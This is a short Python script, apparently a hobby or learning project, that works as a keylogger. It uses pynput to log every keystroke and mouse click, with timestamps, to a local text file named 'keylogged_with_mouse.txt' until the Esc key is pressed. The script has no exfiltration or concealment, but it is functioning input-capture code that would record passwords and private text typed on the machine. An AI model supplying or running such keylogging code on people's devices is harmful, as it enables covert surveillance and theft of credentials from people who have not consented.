from pynput.keyboard import Key, Listener
from pynput.mouse import Listener as msListener
import logging

dir = ".//Keylogger//"
logging.basicConfig(filename= (dir + "keylogged_with_mouse.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    logging.info(f"{str(key)} pressed")


def on_release(key):
    global mouselistener
    if key == Key.esc:
        mouseListener.stop()
        return False


def on_click(x, y, button, pressed):
    logging.info(f"{str(button)} {'pressed' if pressed else 'released'}")


def main():
    global mouseListener
    keyListener = Listener(on_press=on_press, on_release=on_release)
    mouseListener  = msListener(on_click=on_click)

    mouseListener.start()
    keyListener.start()
    mouseListener.join()
    keyListener.join()



if __name__ == "__main__":
    main()
